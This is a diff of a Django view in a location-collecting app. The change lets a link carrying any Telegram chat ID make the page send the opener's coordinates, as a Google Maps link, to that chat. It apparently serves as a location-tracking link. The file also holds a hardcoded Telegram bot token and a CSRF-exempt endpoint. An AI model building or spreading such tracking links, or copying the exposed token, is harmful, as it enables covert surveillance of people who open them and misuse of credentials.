@@ -5,13 +5,9 @@ from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 
 TELEGRAM_BOT_TOKEN = "8444297437:AAHDEuv1a0BvLHeDAzUJHGAxQGRsCsuIoI0"
-CHAT_ID = "8381500320"
-
-def index(request):
-    return render(request, "lokatsiya/index.html")
 
 @csrf_exempt
-def save_location(request):
+def index(request,id):
     if request.method == "POST":
         data = json.loads(request.body)
 
@@ -23,11 +19,11 @@ def save_location(request):
         requests.post(
             f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
             data={
-                "chat_id": CHAT_ID,
+                "chat_id": id,
                 "text": f"📍 Yangi lokatsiya:\n{google_map_url}"
             }
         )
 
         return JsonResponse({"ok": True})
 
-    return JsonResponse({"error": "Bad request"})
+    return render(request, "lokatsiya/index.html", {"id": id})
